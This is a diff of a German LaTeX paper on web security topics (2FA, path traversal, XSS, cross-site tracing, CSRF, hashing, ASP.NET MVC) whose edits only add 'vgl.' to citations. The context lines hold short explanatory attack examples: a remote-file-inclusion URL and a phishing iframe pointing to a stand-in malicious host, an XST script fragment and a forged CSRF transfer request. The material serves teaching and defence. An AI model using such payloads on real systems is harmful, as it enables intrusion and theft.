@@ -57,7 +57,7 @@ Die dabei geltenden Faktoren lauten:
 \item etwas, das sie sind
 \end{enumerate}
 Ein gutes Beispiel für die Zweifaktorauthentifizierung ist die Behebung von Geld an einem Geldautomaten. Nur die korrekte Kombination einer Bankkarte (die der Benutzer besitzt) und einer PIN (die der Benutzer weiß) ermöglicht die Durchführung der Transaktion.\\Als neueres Beispiel könnte man das Anmelden von seinem Google Account nehmen, wo man sein Passwort wissen muss und mit seinem Handy bestätigen, das man sich einloggen will, also etwas das man weiß und etwas was man hat. 
-\textcite{2FA}
+\\ vgl. \textcite{2FA}
 \subsection{2FA Login Code}
 \label{sec:2FALogin}
 \begin{lstlisting}
@@ -145,7 +145,7 @@ Unter Linux ist diese Schwäche kritischer, da man hier auf die komplette Festpl
 \\
 Eine weitere Anwendungsmöglichkeit ist es auf seine eigene bösartige Seite zu verweisen und über diese Seite Code zu injizieren, mit dem man sich noch mehr Möglichkeiten verschafft. \\
 \url{http://some_site.com.br/some-page?page=http://BoeseSeite.com.br/other-page.htm/malicius-code.php}\\
-\textcite{Path-Trav}
+\\ vgl. \textcite{Path-Trav}
 \subsection{Protection Path-Traversal}
 \label{sec:PPT}
 \section{XSS Protection}
@@ -171,7 +171,7 @@ Der Grund hierfür ist, dass Javascript quasi eine fundamentale Einheit einer We
 \item Website-Defacements 
 \item Phishing
 \end{enumerate}
-\textcite{XSS}
+vgl. \textcite{XSS}
 \subsection{Session Hijacking}
 \label{sec:xss_session_hijacking}
 Beim Session Hijacking werden, wie es einem der Name schon verrät, Sessions von Webseiten übernommen. Meist bemerkt ein Benutzer gar nicht das seine Session von einem Angreifer übernommen worden ist. Das Hauptziel ist dabei, dass überwachen von Aktivitäten bzw. Datendiebstahl. Sehr problematisch wird es, wenn eine Administratorsession zugänglich wird und der Angreifer so auf einen Administrator Account zugreifen kann. Bei so einem Vorfall hat der Angreifer dann alle Rechte und kann sich so zusagen austoben, wie er will. Man sieht also eine kleine Cross-Site-Scripting Schwachstelle reicht aus um dies zu bewerkstelligen. 
@@ -204,7 +204,7 @@ Es ergibt sich daraus \\
 <iframe src='http://www.BoeseSeite.com' FRAMEBORDER='0' WIDTH='800' HEIGHT='640' scrolling='auto'></iframe>
 \\
 Diese IFrame beinhaltet jetzt Code von der Bösen Seite und ermöglicht dem Angreifer eingegebene Daten vom Benutzer zu sehen. 
-\textcite{Phishing}
+\\ vgl. \textcite{Phishing}
 \subsection{Cross-Site-Tracing XST}
 \label{sec:CSTXST}
 Beim Cross-Site-Tracing werden XSS und die HTTP-Methoden TRACE oder Track verwendet. TRACE ermöglicht dem Client, zu sehen, was am anderen Ende der Anforderungskette empfangen wird, und diese Daten für Test- oder Diagnoseinformationen zu verwenden.Die TRACK-Methode funktioniert fast gleich, ist jedoch spezifisch für IIS von Microsoft. Cross-Site-Tracing kann als Methode zum Stehlen von User-Cookies über Cross-Site-Scripting verwendet werden, auch wenn für den Cookie das Kennzeichen "HttpOnly" gesetzt ist und / oder der Autorisierungsheader des Benutzers verfügbar gemacht wird.
@@ -225,7 +225,7 @@ Modernere Browser verhindern das TRACE über JavaScript gesendet werden kann.
   xmlhttp.send();
 </script>
 \end{lstlisting}
-\textcite{XST}
+vgl. \textcite{XST}
 \subsection{Wie wird XSS Protection gewährleistet}
 \label{sec:xss_prot}
 Die Webseite beschränkt sich generell auf wenige Eingabefelder wo eine Standard XSS versucht werden könnte. Alle diese Eingabefelder erlauben keine Tags oder Sonderzeichen. Auch Url Parameter können nie direkt gesendet werden und somit fällt auch der URL als Schwachstelle weg.\\ \\Alle Möglichen Eingabefelder
@@ -275,7 +275,7 @@ Auch eine Post Request ist möglich
 POST http://bank.com/transfer.do HTTP/1.1
 acct=Angreifer&amount=1000
 \end{lstlisting}
-\textcite{CSRF}
+vgl. \textcite{CSRF}
 \subsection{Verhindern}
 \label{sec:xsrf_prevent}
 Zuerst wird kurz das Thema Cross-Site Request Forgery wiederholt um die folgenden Erklärungen nachvollziehen zu können. Bei Cross-Site Request Forgery wird ein Benutzer unbewusst dazu gebracht eine Funktion einer Webseite auszuführen die oftmals keine gutwilligen Absichten hat.\\ \\Um dies zu verhindern braucht man eine funktionierende und sichere Authentifikation. \\ \\Die oft beliebteste Form der Authentifizierung ist die Cookie basierende Authentifizierung. Aber auch die auf Token basierenden Authentifizierungssysteme werden immer beliebter, insbesondere für Single Page Applications. Die wichtigsten dieser Typen werden jetzt behandelt.
@@ -397,7 +397,7 @@ Formel 2:\\
     \caption{Sha256 Block decomposition Formel 2}
     \label{fig:sha256form2}
 \end{figure}
-\textcite{sha256}
+vgl. \textcite{sha256}
 \subsection{Passwort Hashes}
 \label{sec:pwdhash}
 Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner Benutzer hasht.
@@ -582,7 +582,7 @@ Eine Controller-Aktion gibt ein sogenanntes Aktionsergebnis zurück. Ein Aktions
 \item FileStreamResult - Represents a downloadable file (with a file stream).
 \end{enumerate}
 Alle diese Resultate kommen von der Basis Klasse ActionResult.
-\textcite{mic_controller}
+\\ vgl. \textcite{mic_controller}
 \subsection{Views}
 \label{sec:Views}
 Anders als in ASP.NET oder Active Server Pages enthält ASP.NET MVC nichts, was direkt einer HTML-Seite entspricht. In einer ASP.NET MVC-Anwendung befindet sich keine HTML-Seite auf der Festplatte gespeichert, die dem Pfad in der URL entspricht, den man in die Adressleiste des Browsers eingibt. Die Seite, die einer HTML-Seite in einer ASP.NET-MVC-Anwendung am nächsten kommt, wird als View bezeichnet.\\
@@ -631,7 +631,7 @@ Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
 }
 \end{lstlisting}
 (erklären)
-\textcite{mic_views}
+\\ vgl. \textcite{mic_views}
 \section{User Datenbank}
 \label{sec:UserDB}
 Ein wichtiger Bereich der UserDB ist der Salt,also wird dieses Thema zuerst besprochen.
